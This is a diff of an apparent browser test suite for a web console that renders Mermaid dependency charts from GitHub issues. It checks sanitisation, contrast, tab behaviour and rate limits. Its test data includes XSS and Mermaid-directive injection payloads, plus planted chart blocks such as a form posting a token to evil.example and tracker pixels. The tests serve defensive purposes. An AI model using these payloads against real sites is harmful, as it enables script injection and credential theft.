@@ -2,8 +2,9 @@
 // section of the one long page until the page became a console of tabs, site pull request #40)
 // against a mocked GitHub API: the chart text the page builds from GitHub's REST objects, byte for
 // byte the two blocks the protocol's board writes for the same state (symphony-protocol
-// tests/fixtures/board-epics.json and board-epics-STATE.md at 34c5586, copied below) and the block it
-// writes for hostile titles and titles that spell a Mermaid directive, the reads it makes and the
+// tests/fixtures/board-epics.json and board-epics-STATE.md, copied below) and the block it writes
+// for hostile titles, titles that spell a Mermaid directive or its math and titles the board folds
+// to ASCII, the reads it makes and the
 // ones it never makes, the vendored Mermaid loaded from the site only when there is a chart and
 // drawing both charts with their nodes and classes, a tab of its own in the console's rail after
 // Tasks, with its ARIA and its address, the charts drawn while the tab is hidden and shown whole
@@ -16,8 +17,12 @@
 // mid-load, a second page of sub-issues read and counted, pull requests and another repository's
 // issues left out, a deleted issue read as none, the repository's record unread, a repository
 // renamed, a claim shown by its pull request, one chart that cannot be drawn, the board's own charts
-// drawn in the Board tab, the last repository taken off the list and an open list cut short. Each
-// check states what the page promises; a FAIL is a defect. Every token is a stand-in.
+// drawn in the Board tab as the board's own bytes and only where every line is one the board
+// writes, a board whose title opens an HTML comment shown whole, the charts on a ground their edges
+// show on, a press on a task the tables do not hold staying in this tab, a draw that reads nothing
+// once the open issues' answer says the token is under the reserve, the last repository taken off
+// the list and an open list cut short. Each check states what the page promises; a FAIL is a
+// defect. Every token is a stand-in.
 //
 // The console shows one tab at a time, so each check opens the Dependencies tab by its rail button
 // before it reads or presses inside it, and console-tabs.mjs opens any other tab a press names, as
@@ -99,7 +104,7 @@ function fixture(completed) {
 // what the page must hand the drawing for the goals and for epic #20. Check A0 compares them with a
 // checkout of symphony-protocol where SYMPHONY_PROTOCOL names one, so a change to the library's
 // fixture is seen before the page drifts from the board; the commit says where to diff from.
-const FIXTURE_COMMIT = '34c5586';
+const FIXTURE_COMMIT = '468fc44';
 const GOALS_TEXT = [
   'flowchart TD',
   '  i20["#20 Draw the board (1/3)"]',
@@ -191,6 +196,7 @@ async function open(routes, opts) {
     return route.fulfill({ status: spec.status, contentType: 'application/json', headers, body: JSON.stringify(spec.body) });
   });
   await context.route('**/assets/js/symphony-panel.js*', (route) => route.fulfill({ status: 200, contentType: 'application/javascript', body: served }));
+  if (process.env.NOCSS) await context.route('**/assets/css/control.css*', (route) => route.fulfill({ status: 200, contentType: 'text/css', body: withoutGround() }));
   if (opts.extraRoutes) for (const [pattern, handler] of opts.extraRoutes) await context.route(pattern, handler);
   // every scrollIntoView the page makes, so a check can tell what it centred
   await context.addInitScript(() => {
@@ -217,6 +223,15 @@ async function open(routes, opts) {
   return { context, page, calls, errors, requests, dialogs, opened };
 }
 function safeJson(req) { try { return req.postDataJSON(); } catch (e) { return req.postData(); } }
+// With NOCSS set, the site's stylesheet is served without the rule that gives a chart its light
+// ground inside the dark console, so a run can show that C and R fail without it (the mutants
+// change only the script).
+const GROUND_RULE = '.console .control__chart { background: #FBFAF4; color: #1A1C18; }';
+function withoutGround() {
+  const css = fs.readFileSync(SITE + '/assets/css/control.css', 'utf8');
+  assert.ok(css.includes(GROUND_RULE), 'the chart ground rule was not found in the stylesheet');
+  return css.replace(GROUND_RULE, '');
+}
 // signs in with the pasted token and opens the tab named, the Dependencies tab unless a check wants
 // to stay where the console opened (null)
 async function signIn(page, tab) {
@@ -254,6 +269,29 @@ const stateText = (page) => page.textContent('#cp-graph-state');
 const waitGraph = (page, re, timeout) => page.waitForFunction((src) => new RegExp(src).test(document.getElementById('cp-graph-state').textContent), re.source, { timeout: timeout || 8000 });
 const vendorLoads = (requests) => requests.filter((u) => /\/assets\/js\/vendor\/mermaid\.min\.js/.test(u)).length;
 const headings = (page) => page.$$eval('#cp-graph h3', (hs) => hs.map((h) => h.textContent));
+// for each drawn chart in a box, the contrast against the ground it is drawn on (the nearest box
+// with a colour of its own) of its first edge, its first arrowhead and its host's own words, as
+// WCAG's relative luminance gives it; a ratio, not a colour, so the console's shades may change
+const chartContrast = (page, scope) => page.$$eval(scope + ' .control__chart', (hosts) => {
+  const rgb = (c) => { const m = /rgba?\(([^)]+)\)/.exec(c || ''); return m ? m[1].split(',').map((x) => parseFloat(x)) : null; };
+  const lum = (c) => [0, 1, 2].map((i) => { const v = c[i] / 255; return v <= 0.03928 ? v / 12.92 : Math.pow((v + 0.055) / 1.055, 2.4); }).reduce((sum, v, i) => sum + v * [0.2126, 0.7152, 0.0722][i], 0);
+  const ratio = (a, b) => (a && b) ? Math.round(100 * (Math.max(lum(a), lum(b)) + 0.05) / (Math.min(lum(a), lum(b)) + 0.05)) / 100 : 0;
+  const ground = (node) => { for (let n = node; n; n = n.parentElement) { const c = rgb(getComputedStyle(n).backgroundColor); if (c && (c.length < 4 || c[3] > 0)) return c; } return [255, 255, 255]; };
+  const paint = (node, prop) => { if (!node) return null; const v = getComputedStyle(node)[prop]; return v && v !== 'none' ? rgb(v) : null; };
+  return hosts.filter((h) => h.querySelector('svg')).map((h) => {
+    const g = ground(h), edge = h.querySelector('.edgePaths path'), arrow = h.querySelector('marker path');
+    return { ground: g, edge: ratio(paint(edge, 'stroke'), g), arrow: ratio(paint(arrow, 'fill') || paint(arrow, 'stroke'), g), words: ratio(rgb(getComputedStyle(h).color), g) };
+  });
+});
+// the edges and arrowheads show on their ground (3 to 1, WCAG's floor for a graphic), and the host's
+// own words, "Drawing the chart..." and a failure, read on it (4.5 to 1)
+function assertContrast(seen) {
+  assert.ok(seen.length > 0, 'no drawn chart to measure');
+  for (const c of seen) {
+    assert.ok(c.edge >= 3 && c.arrow >= 3, 'a chart\'s edges or arrowheads barely show on its ground: ' + JSON.stringify(c));
+    assert.ok(c.words >= 4.5, 'a chart\'s own words barely read on its ground: ' + JSON.stringify(c));
+  }
+}
 
 // the fenced Mermaid blocks of a board's text, the fences dropped
 const mermaidBlocks = (text) => [...text.matchAll(/^```mermaid\n([\s\S]*?)\n```$/gm)].map((m) => m[1]);
@@ -264,13 +302,26 @@ if (process.env.SYMPHONY_PROTOCOL) {
   });
 } else console.log('SKIP A0: SYMPHONY_PROTOCOL names no checkout of symphony-protocol; the pasted blocks are from ' + FIXTURE_COMMIT);
 
-// Check F's epic #41: a hostile title and four that spell a Mermaid directive, %%{ ... }%%, which
-// Mermaid looks for anywhere in the text before it reads the entities. The board writes "%" as the
-// entity #37; since symphony-protocol 34c5586, as the page's graphLabel does, so the block below is
-// what the library at FIXTURE_COMMIT writes for these titles (board.mermaid_block over them, all
-// labelled todo, with no relation), and check A1 renders it again with the checkout named.
+// Check F's epic #41: a hostile title, four that spell a Mermaid directive, %%{ ... }%%, which
+// Mermaid looks for anywhere in the text before it reads the entities, two holding $$...$$, which
+// Mermaid typesets as math and which stopped the whole chart from drawing where the formula did not
+// parse, and four the board folds to ASCII, among them the small and fullwidth percent and dollar
+// signs that the fold turns into the plain ones before they are written as entities. The board
+// writes "%" as #37; since symphony-protocol 34c5586 and "$" as #36; since 468fc44, as the page's
+// graphLabel does, so the block below is what the library at FIXTURE_COMMIT writes for these titles
+// (board.mermaid_block over them, all labelled todo, with no relation), and check A1 renders it
+// again with the checkout named.
 const HOSTILE = '<img src=x onerror=alert(1)> "] <script>alert(2)</script> and more';
 const PERCENT_TITLES = { 43: '%%{init:{ broken', 44: '%%{init:{"theme":"dark"}}%% x', 45: 'Opens %%{init', 46: 'closes it }%% later' };
+const DOLLAR_TITLES = { 47: '$$\\def\\x{\\x\\x}\\x$$', 48: 'Pay $$5 or $$ more' };
+// each title the board folds, and the text its node shows once Mermaid has read the entities
+const FOLDED_TITLES = {
+  49: ['Caf\u00e9 na\u00efve \u2460 \ufb01le', '#49 Cafe naive 1 file'],
+  51: ['a \uff05\uff05{init} \ufe6a b \uff04\uff04x\ufe69\ufe69', '#51 a %%{init} % b $$x$$'],
+  52: ['\u65e5\u672c \u2163 x y z', '#52 IV x y z'],
+  53: ['e\u0301\u0301 \u00c5', '#53 e A'],
+};
+const F_TITLES = Object.assign({ 42: HOSTILE }, PERCENT_TITLES, DOLLAR_TITLES, Object.fromEntries(Object.entries(FOLDED_TITLES).map(([n, t]) => [n, t[0]])));
 const F_EPIC_41_TEXT = [
   'flowchart TD',
   '  i42["#42 #lt;img src=x onerror=alert(1)#gt; #quot;] #lt;scri..."]:::todo',
@@ -278,6 +329,12 @@ const F_EPIC_41_TEXT = [
   '  i44["#44 #37;#37;{init:{#quot;theme#quot;:#quot;dark#quot;}}#37;#37; x"]:::todo',
   '  i45["#45 Opens #37;#37;{init"]:::todo',
   '  i46["#46 closes it }#37;#37; later"]:::todo',
+  '  i47["#47 #36;#36;\\def\\x{\\x\\x}\\x#36;#36;"]:::todo',
+  '  i48["#48 Pay #36;#36;5 or #36;#36; more"]:::todo',
+  '  i49["#49 Cafe naive 1 file"]:::todo',
+  '  i51["#51 a #37;#37;{init} #37; b #36;#36;x#36;#36;"]:::todo',
+  '  i52["#52 IV x y z"]:::todo',
+  '  i53["#53 e A"]:::todo',
   '  classDef todo fill:#ffffff,stroke:#0e8a16,color:#000000',
   '  classDef claimed fill:#fff8d6,stroke:#fbca04,color:#000000',
   '  classDef review fill:#e3f0ff,stroke:#1d76db,color:#000000',
@@ -286,7 +343,7 @@ const F_EPIC_41_TEXT = [
 ].join('\n');
 if (process.env.SYMPHONY_PROTOCOL) {
   await check('A1: the block pasted for check F\'s titles is the library\'s own, as the checkout named renders it', async () => {
-    const titles = Object.assign({ 42: HOSTILE }, PERCENT_TITLES);
+    const titles = F_TITLES;
     const code = 'import json, sys\nfrom sdlc_protocol import board\ntitles = json.loads(sys.argv[1])\nprint(board.mermaid_block([board.Issue(int(n), t, labels=["todo"]) for n, t in titles.items()], [], set()))\n';
     const out = execFileSync('python3', ['-c', code, JSON.stringify(titles)], { cwd: process.env.SYMPHONY_PROTOCOL, encoding: 'utf8' });
     assert.deepEqual(mermaidBlocks(out.trimEnd()), [F_EPIC_41_TEXT], 'the library writes these titles otherwise since ' + FIXTURE_COMMIT + ': paste its block again');
@@ -360,6 +417,10 @@ await check('C: the vendored Mermaid, loaded once from the site, draws both char
   assert.equal(byNumber(svgs[1].nodes, 23).text, '#23 Write the body | with "quotes" and <t...');
   assert.equal(byNumber(svgs[0].nodes, 20).text, '#20 Draw the board (1/3)');
   assert.ok(svgs.every((s) => /px$/.test(s.minWidth)), 'a chart keeps its own width: ' + svgs.map((s) => s.minWidth));
+  // the console is dark and Mermaid draws its edges dark, so the charts need a light ground of their own
+  const contrast = await chartContrast(page, '#cp-graph');
+  console.log('     contrast on the ground:', JSON.stringify(contrast));
+  assertContrast(contrast);
   assert.deepEqual(errors, []);
   await context.close();
 });
@@ -372,6 +433,7 @@ await check('D: a node pressed opens the Tasks tab with the task\'s row centred 
   await page.evaluate(() => { window.__scrolled.length = 0; });
   const before = await where(page);
   assert.deepEqual([before.hash, before.shown, before.y], ['#dependencies', ['dependencies'], 0]);
+  assert.ok(before.scrollable, 'the page fits the window, so the window staying at 0 proves nothing');
   await page.click('#cp-graph g.node[id*="-flowchart-i22-"]');
   // read at once, before any call that would open a tab itself
   const after = await where(page);
@@ -387,7 +449,7 @@ await check('D: a node pressed opens the Tasks tab with the task\'s row centred 
   const scrolled = await page.evaluate(() => window.__scrolled);
   console.log('     said:', said, '| message line:', await msgText(page), '| scrolled:', JSON.stringify(scrolled), '| pages:', context.pages().length, '| the page could scroll:', before.scrollable);
   assert.equal(said, 'Focused #22 (under Claimed).');
-  // the said line is in the Dependencies tab, which the press hid, so the words are on the message line too
+  // the said line is in the Dependencies tab, which the press hid, and the words are on the message line too
   assert.equal(await msgText(page), 'Focused #22 (under Claimed).');
   assert.ok(scrolled.some((s) => /^TR:#22/.test(s)), 'the row was not centred: ' + JSON.stringify(scrolled));
   assert.deepEqual(opened.map((p) => p.url()), []);
@@ -428,16 +490,16 @@ await check('E: when the drawing script cannot be loaded, the tables stand alone
   await context.close();
 });
 
-// Check F's repository: the fixture and epic #41 over the hostile title and the four "%" titles (above,
-// before A1): one opening a directive, one holding a whole one, and a pair that opens one and closes
-// it in a later node, each of which broke the chart or erased what lay between before the "%" went
-// as an entity.
+// Check F's repository: the fixture and epic #41 over the titles above (before A1): among the "%"
+// ones, one opening a directive, one holding a whole one, and a pair that opens one and closes it in
+// a later node, each of which broke the chart or erased what lay between before the "%" went as an
+// entity; a formula KaTeX cannot parse, which stopped the chart before the "$" did; and the folded
+// ones. The epic's own title is folded in its heading as the board folds it.
 function scenarioF() {
   const f = fixture();
-  const i42 = issue(42, HOSTILE, ['todo']);
-  const percent = Object.entries(PERCENT_TITLES).map(([n, title]) => issue(Number(n), title, ['todo']));
-  f.open.push(issue(41, 'An epic " with a quote', ['epic'], subs(0, 5)), i42, ...percent);
-  f.subIssues[41] = [i42, ...percent];
+  const children = Object.entries(F_TITLES).map(([n, title]) => issue(Number(n), title, ['todo']));
+  f.open.push(issue(41, 'An epic " with a quote, d\u00e9j\u00e0 vu', ['epic'], subs(0, children.length)), ...children);
+  f.subIssues[41] = children;
   return fixtureRoutes(f);
 }
 await check('F: a hostile title is drawn as text, makes no element, runs nothing and fetches nothing', async () => {
@@ -457,18 +519,24 @@ await check('F: a hostile title is drawn as text, makes no element, runs nothing
   assert.deepEqual(dialogs, []);
   assert.equal(requests.filter((u) => /\/x$/.test(u)).length, 0);
   assert.equal(cell, hostile);
-  assert.deepEqual((await headings(page)).slice(-1), ['Epic #41: An epic " with a quote (0/5)']);
-  // every chart drawn, and each "%" title shown whole in its node
+  assert.deepEqual((await headings(page)).slice(-1), ['Epic #41: An epic " with a quote, deja vu (0/11)']);
+  // every chart drawn, epic #41's despite its formulas, each "%" and "$" title shown whole in its
+  // node, as words and not as math, and each folded one as the board folds it
   assert.equal(await page.$$eval('#cp-graph .control__chart svg', (l) => l.length), 3);
-  for (const [n, title] of Object.entries(PERCENT_TITLES)) {
+  assert.equal(await page.$$eval('#cp-graph math, #cp-graph .katex', (l) => l.length), 0, 'a title was typeset as math');
+  for (const [n, title] of Object.entries(Object.assign({}, PERCENT_TITLES, DOLLAR_TITLES))) {
     const text = await page.$eval('#cp-graph g.node[id*="-flowchart-i' + n + '-"]', (g) => g.textContent.trim());
     assert.equal(text, '#' + n + ' ' + title);
+  }
+  for (const [n, [, shown]] of Object.entries(FOLDED_TITLES)) {
+    const text = await page.$eval('#cp-graph g.node[id*="-flowchart-i' + n + '-"]', (g) => g.textContent.trim());
+    assert.equal(text, shown);
   }
   assert.deepEqual(errors, []);
   await context.close();
 });
 
-await check('F2: the text handed the drawing for a hostile title and the "%" titles is byte for byte the board\'s block, with no "%" left in it', async () => {
+await check('F2: the text handed the drawing for a hostile title, the "%" and "$" titles and the folded ones is byte for byte the board\'s block, with no "%" or "$" left in it', async () => {
   const { context, page, errors } = await open(scenarioF(), { extraRoutes: [stubRoute] });
   await signIn(page);
   await waitGraph(page, /^Drawn from 5 reads/);
@@ -476,6 +544,7 @@ await check('F2: the text handed the drawing for a hostile title and the "%" tit
   console.log('     epic #41 handed:', JSON.stringify(charts[2] && charts[2].split('\n').slice(1, 6)));
   assert.deepEqual(charts, [GOALS_TEXT, EPIC_20_TEXT, F_EPIC_41_TEXT]);
   assert.ok(charts.every((text) => !text.includes('%')), 'a "%" reached the drawing');
+  assert.ok(charts.every((text) => !text.includes('$')), 'a "$" reached the drawing');
   assert.deepEqual(errors, []);
   await context.close();
 });
@@ -624,9 +693,33 @@ await check('G4: a read that finds the token under the reserve stops the draw th
   await sleep(500);
   const state = await stateText(page);
   console.log('     state:', state, '| reads:', JSON.stringify(dependencyReads(calls)));
-  assert.equal(state, 'Not drawn: GitHub says this token has 99 calls left this hour, and the page keeps the last 100 for its other sections; stopped at the issues blocking #22. Press Refresh once GitHub\'s hourly limit has reset.');
+  assert.equal(state, 'Not drawn: GitHub says this token has 99 calls left this hour, and the page keeps the last 100 for the rest of the console; stopped at the issues blocking #22. Press Refresh once GitHub\'s hourly limit has reset.');
   assert.deepEqual(dependencyReads(calls), EXPECTED_READS.slice(0, 1));
   assert.equal(await page.$$eval('#cp-graph > *', (l) => l.length), 0);
+  assert.deepEqual(errors, []);
+  await context.close();
+});
+
+await check('G5: once the open issues\' answer says the token is under the reserve, a draw reads nothing, and a Refresh under it reads nothing either', async () => {
+  const f = fixture();
+  const routes = fixtureRoutes(f);
+  let left = 99;
+  routes['GET /repos/acme/demo/issues'] = () => resp(200, f.open, { headers: { 'X-RateLimit-Remaining': String(left--), 'Access-Control-Expose-Headers': 'ETag, Link, X-RateLimit-Remaining' } });
+  const { context, page, calls, errors, requests } = await open(routes);
+  await signIn(page);
+  await waitGraph(page, /^Not drawn: GitHub says/);
+  await sleep(500);
+  const state = await stateText(page);
+  console.log('     state:', state, '| reads:', JSON.stringify(dependencyReads(calls)));
+  assert.equal(state, 'Not drawn: GitHub says this token has 99 calls left this hour, and the page keeps the last 100 for the rest of the console; stopped at the sub-issues of #20. Press Refresh once GitHub\'s hourly limit has reset.');
+  assert.deepEqual(dependencyReads(calls), []);
+  await page.click('#cp-refresh');
+  await waitGraph(page, /^Not drawn: GitHub says this token has 98 calls/);
+  await sleep(500);
+  console.log('     after Refresh:', await stateText(page), '| reads:', JSON.stringify(dependencyReads(calls)));
+  assert.deepEqual(dependencyReads(calls), []);
+  assert.equal(await page.$$eval('#cp-graph > *', (l) => l.length), 0);
+  assert.equal(vendorLoads(requests), 0);
   assert.deepEqual(errors, []);
   await context.close();
 });
@@ -829,8 +922,12 @@ await check('R: the board\'s own charts are drawn in the Board tab while it is h
   assert.equal(await page.$$eval('#cp-board pre', (l) => l.length), 0);
   assert.deepEqual(await page.$$eval('#cp-board h4, #cp-board h3', (hs) => hs.map((h) => h.textContent)).then((hs) => hs.filter((h) => /Goals|Epic/.test(h))), ['Goals', 'Epic #20: Draw the board (1/3)']);
   assert.equal(vendorLoads(requests), 1);
+  const contrast = await chartContrast(page, '#cp-board');
+  console.log('     contrast on the ground:', JSON.stringify(contrast));
+  assertContrast(contrast);
   const before = await where(page);
   assert.deepEqual([before.hash, before.shown, before.y], ['#board', ['board'], 0]);
+  assert.ok(before.scrollable, 'the page fits the window, so the window staying at 0 proves nothing');
   await page.click('#cp-board g.node[id*="-flowchart-i22-"]');
   // read at once, before any call that would open a tab itself
   const after = await where(page);
@@ -844,6 +941,111 @@ await check('R: the board\'s own charts are drawn in the Board tab while it is h
   assert.equal(await page.textContent('#cp-graph-said'), 'Focused #22 (under Claimed).');
   // pressed from the Board tab, the person sees neither tab's said line, so the message line says it
   assert.equal(await msgText(page), 'Focused #22 (under Claimed).');
+  assert.deepEqual(errors, []);
+  await context.close();
+});
+
+// a board's text with its Dependencies section holding the blocks given, each under its heading
+function boardWith(blocks) {
+  return board + '\n## Dependencies\n\nEach open epic\'s tasks as GitHub\'s sub-issues and blocked-by relations hold them.\n' +
+    blocks.map(([heading, text]) => '\n### ' + heading + '\n\n```mermaid\n' + text + '\n```\n').join('');
+}
+// a repository with no epic, so the Dependencies tab hands the drawing nothing and whatever is drawn is the board's
+function boardOnlyRoutes(text) {
+  const routes = baseRoutes('acme/demo', [issue(7, 'A task', ['todo']), issue(8, 'Another', ['claimed', 'worker:alice'])]);
+  routes['GET /repos/acme/demo/contents/STATE.md'] = { encoding: 'base64', content: b64(text) };
+  return routes;
+}
+await check('R2: the text the Board tab hands the drawing for the board\'s own blocks is byte for byte the board\'s', async () => {
+  const { context, page, errors } = await open(boardOnlyRoutes(boardWith([['Goals', GOALS_TEXT], ['Epic #20: Draw the board (1/3)', EPIC_20_TEXT]])), { extraRoutes: [stubRoute] });
+  await signIn(page, null);
+  await page.waitForFunction(() => (window.__charts || []).length === 2, null, { timeout: 8000 });
+  await sleep(300);
+  const charts = await page.evaluate(() => window.__charts);
+  console.log('     handed:', charts.length, '| first lines:', JSON.stringify(charts.map((c) => c.split('\n')[1])));
+  assert.deepEqual(charts, [GOALS_TEXT, EPIC_20_TEXT]);
+  assert.deepEqual(errors, []);
+  await context.close();
+});
+
+// What anyone who may push the branch board could put in its charts: a picture fetched from
+// elsewhere, a form posting elsewhere, fields under the ids the page's own forms are read by, a
+// directive that would load a font from elsewhere, a node made a link, a label written raw, and a
+// node whose label names another number. None of them is a chart as the board writes it.
+const PLANTED = [
+  ['Planted: an image', 'flowchart TD\n  A["<img src=https://tracker.example/pixel.png>"]'],
+  ['Planted: a form', 'flowchart TD\n  A["<form action=https://evil.example/collect method=post><input name=token><button>Go</button></form>"]'],
+  ['Planted: the page\'s own fields', 'flowchart TD\n  A["<input type=hidden id=cp-task-title value=Planted><textarea id=cp-prompt>Planted</textarea>"]'],
+  ['Planted: a directive', '%%{init: {"fontFamily": "x; src: url(https://tracker.example/font.woff)"}}%%\nflowchart TD\n  i1["#1 a"]'],
+  ['Planted: a link', 'flowchart TD\n  i1["#1 a"]\n  click i1 href "https://evil.example/a"'],
+  ['Planted: a raw label', 'flowchart TD\n  i1["#1 <b>bold</b> $$x$$"]:::todo'],
+  ['Planted: another number', 'flowchart TD\n  i1["#2 a"]:::todo'],
+];
+await check('X: the Board tab draws a block of the board\'s text only where every line is one the board writes, shows any other as text, and nothing planted makes an element or a request', async () => {
+  const text = boardWith([['Goals', GOALS_TEXT], ['Epic #20: Draw the board (1/3)', EPIC_20_TEXT]].concat(PLANTED));
+  const { context, page, errors, requests, dialogs } = await open(boardOnlyRoutes(text));
+  await signIn(page, null);
+  await page.waitForFunction(() => document.querySelectorAll('#cp-board .control__chart svg').length === 2, null, { timeout: 15000 });
+  await sleep(800);
+  const seen = await page.evaluate(() => {
+    const box = document.getElementById('cp-board');
+    return {
+      svgs: box.querySelectorAll('svg').length,
+      planted: box.querySelectorAll('img, form, input, button, textarea, select, a, iframe, object, embed').length,
+      notDrawn: Array.from(box.querySelectorAll('p')).filter((p) => /^Not drawn: this block is not a chart as the board writes it/.test(p.textContent)).length,
+      shownAsText: Array.from(box.querySelectorAll('pre')).map((pre) => pre.textContent),
+      hosts: box.querySelectorAll('[data-chart]').length,
+      taskTitle: document.getElementById('cp-task-title') && !!document.getElementById('cp-task-title').closest('#tab-tasks'),
+      prompt: document.getElementById('cp-prompt') && !document.getElementById('cp-prompt').closest('#cp-board'),
+      ids: document.querySelectorAll('#cp-task-title').length + ':' + document.querySelectorAll('#cp-prompt').length,
+    };
+  });
+  const elsewhere = requests.filter((u) => !u.startsWith(BASE) && !/^https:\/\/api\.github\.com\//.test(u) && !/^https:\/\/fonts\.(googleapis|gstatic)\.com\//.test(u));
+  console.log('     seen:', JSON.stringify(Object.assign({}, seen, { shownAsText: seen.shownAsText.length })), '| requests elsewhere:', JSON.stringify(elsewhere), '| vendor loads:', vendorLoads(requests));
+  assert.equal(seen.svgs, 2, 'the board\'s own two charts were not both drawn');
+  assert.equal(seen.planted, 0, 'a planted element is in the Board tab');
+  assert.equal(seen.notDrawn, PLANTED.length);
+  assert.deepEqual(seen.shownAsText, PLANTED.map((b) => b[1]));
+  // only the board's own two blocks keep the text they are drawn from
+  assert.equal(seen.hosts, 2, 'a planted block kept its text to be drawn');
+  assert.equal(seen.taskTitle, true, 'the task form\'s title is not the Tasks tab\'s own field');
+  assert.equal(seen.prompt, true);
+  assert.equal(seen.ids, '1:1', 'a planted field took one of the page\'s ids');
+  assert.deepEqual(elsewhere, []);
+  assert.equal(vendorLoads(requests), 1);
+  assert.deepEqual(dialogs, []);
+  assert.deepEqual(errors, []);
+  await context.close();
+  // a board whose only blocks are planted loads no drawing script at all
+  const only = await open(boardOnlyRoutes(boardWith(PLANTED)));
+  await signIn(only.page, null);
+  await only.page.waitForFunction((n) => document.querySelectorAll('#cp-board pre').length === n, PLANTED.length, { timeout: 8000 });
+  await sleep(500);
+  console.log('     planted alone: vendor loads', vendorLoads(only.requests));
+  assert.equal(vendorLoads(only.requests), 0);
+  assert.deepEqual(only.errors, []);
+  await only.context.close();
+});
+
+await check('Y: a title on the board that opens an HTML comment hides nothing after it, and a pipe the board escapes in a heading reads as a pipe', async () => {
+  const text = '# Board\n\n## Open pull requests\n\n| PR | Title | Branch |\n| --- | --- | --- |\n| #80 | Tidy <!-- the docs | mallory:main |\n\n## Queue (open issues labelled todo, unclaimed and given to no worker)\n\n| Issue | Title | Labels |\n| --- | --- | --- |\n| #23 | Write the body | todo |\n' +
+    '\n## Dependencies\n\nEach open epic\'s tasks.\n\n### Goals\n\n```mermaid\n' + GOALS_TEXT + '\n```\n\n### Epic #20: Draw \\| the board (1/3)\n\n```mermaid\n' + EPIC_20_TEXT + '\n```\n';
+  const { context, page, errors } = await open(boardOnlyRoutes(text), { extraRoutes: [stubRoute] });
+  await signIn(page, null);
+  await page.waitForFunction(() => (window.__charts || []).length === 2, null, { timeout: 8000 });
+  const seen = await page.evaluate(() => {
+    const box = document.getElementById('cp-board');
+    return {
+      cell: (Array.from(box.querySelectorAll('td')).find((td) => /Tidy/.test(td.textContent)) || {}).textContent,
+      headings: Array.from(box.querySelectorAll('h2, h3, h4')).map((h) => h.textContent),
+      queueRow: Array.from(box.querySelectorAll('td')).some((td) => td.textContent === 'Write the body'),
+    };
+  });
+  console.log('     seen:', JSON.stringify(seen));
+  assert.equal(seen.cell, 'Tidy <!-- the docs');
+  assert.ok(seen.queueRow, 'the Queue\'s row is gone');
+  assert.deepEqual(seen.headings.filter((h) => /^(Queue|Dependencies|Goals|Epic)/.test(h)), ['Queue (open issues labelled todo, unclaimed and given to no worker)', 'Dependencies', 'Goals', 'Epic #20: Draw | the board (1/3)']);
+  assert.deepEqual(await page.evaluate(() => window.__charts), [GOALS_TEXT, EPIC_20_TEXT]);
   assert.deepEqual(errors, []);
   await context.close();
 });
@@ -946,7 +1148,7 @@ function assistantRoutes(routes) {
   return routes;
 }
 await check('V: the assistant\'s "show dependencies" opens the Dependencies tab at its first chart and leaves the window where it was', async () => {
-  const { context, page, errors } = await open(assistantRoutes(fixtureRoutes(fixture())), {
+  const { context, page, calls, errors } = await open(assistantRoutes(fixtureRoutes(fixture())), {
     storage: { symphony_panel_assistant: '{"acme/demo":50}' },
     constants: { ASSISTANT_POLL_MS: 400, ASSISTANT_SLOW_MS: 400, ASSISTANT_AFTER_MS: 1500 },
   });
@@ -957,11 +1159,14 @@ await check('V: the assistant\'s "show dependencies" opens the Dependencies tab 
   const left = await page.evaluate(() => { const box = document.getElementById('cp-graph').closest('.console__scroll'); box.scrollTop = box.scrollHeight; return box.scrollTop; });
   assert.ok(left > 0, 'the charts fit their box, so where the answer leaves it says nothing');
   await page.waitForFunction(() => /The assistant issue is #50/.test(document.getElementById('cp-as-state').textContent), null, { timeout: 8000 });
-  // the question box is in the Ask tab, which the fill opens
+  // the question is asked from the Ask Claude bar at the console's foot while the Board tab is shown,
+  // so the answer is what opens the Dependencies tab
+  await toTab(page, 'board');
   await page.fill('#cp-as-q', 'What blocks what?');
   await page.click('#cp-as-ask');
   const asked = await where(page);
-  assert.deepEqual(asked.shown, ['ask']);
+  assert.deepEqual(asked.shown, ['board']);
+  assert.ok(asked.scrollable, 'the page fits the window, so the window staying at 0 proves nothing');
   await page.waitForFunction(() => /Showing the Dependencies tab/.test(document.getElementById('cp-as-actions').textContent), null, { timeout: 10000 });
   const shown = await where(page);
   const top = await page.evaluate(() => document.getElementById('cp-graph').closest('.console__scroll').scrollTop);
@@ -974,6 +1179,44 @@ await check('V: the assistant\'s "show dependencies" opens the Dependencies tab 
   assert.equal(top, 0, 'the charts\' box was not put back at its first chart');
   assert.equal(view, 'in view');
   assert.match(actions, /Showing the Dependencies tab, which this page draws\./);
+  // the next question tells the assistant the section the page is at
+  await page.fill('#cp-as-q', 'And now?');
+  await page.click('#cp-as-ask');
+  let next = null;
+  for (let i = 0; i < 40 && !next; i++) { next = calls.filter((c) => c.key === 'POST /repos/acme/demo/issues/50/comments')[1]; if (!next) await sleep(100); }
+  console.log('     the next question\'s state:', JSON.stringify(next && next.body && next.body.body.split('```symphony-state\n')[1]));
+  assert.ok(next, 'the second question was not sent');
+  assert.match(next.body.body, /\nsection: Dependencies\n/);
+  assert.deepEqual(errors, []);
+  await context.close();
+});
+
+await check('W: a node pressed for a task the tables do not hold stays in this tab, says why here and on the message line, and leaves the window where it was', async () => {
+  const { context, page, errors, opened } = await open(fixtureRoutes(fixture()));
+  await signIn(page);
+  await page.waitForSelector('#cp-graph svg', { timeout: 15000 });
+  await waitGraph(page, /^Drawn from 4 reads/, 15000);
+  // an earlier press, which opened the Tasks tab and said its focus on the message line
+  await page.click('#cp-graph g.node[id*="-flowchart-i22-"]');
+  await page.waitForFunction(() => /Focused #22/.test(document.getElementById('msg').textContent), null, { timeout: 8000 });
+  await toTab(page, 'dependencies');
+  const before = await where(page);
+  // #21 is closed, so no task table holds it
+  await page.click('#cp-graph g.node[id*="-flowchart-i21-"]');
+  const after = await where(page);
+  await sleep(800);
+  const settled = await where(page);
+  const said = await page.textContent('#cp-graph-said');
+  const msg = await msgText(page);
+  console.log('     after the press:', JSON.stringify(after), '| a moment later:', settled.y, '| said:', said, '| message line:', msg);
+  const words = '#21 is the focus, but it is not in the task tables (closed, a pull request, or without the protocol\'s labels).';
+  assert.deepEqual([before.hash, before.shown], ['#dependencies', ['dependencies']]);
+  assert.deepEqual([after.hash, after.shown, after.y, settled.hash, settled.shown, settled.y], ['#dependencies', ['dependencies'], 0, '#dependencies', ['dependencies'], 0], 'the press left the tab or moved the window');
+  assert.equal(said, words);
+  // the message line follows the press, so it no longer says the earlier focus
+  assert.equal(msg, words);
+  assert.equal(await page.$$eval('#cp-app tr.control__focus', (rows) => rows.length), 0);
+  assert.deepEqual(opened.map((p) => p.url()), []);
   assert.deepEqual(errors, []);
   await context.close();
 });
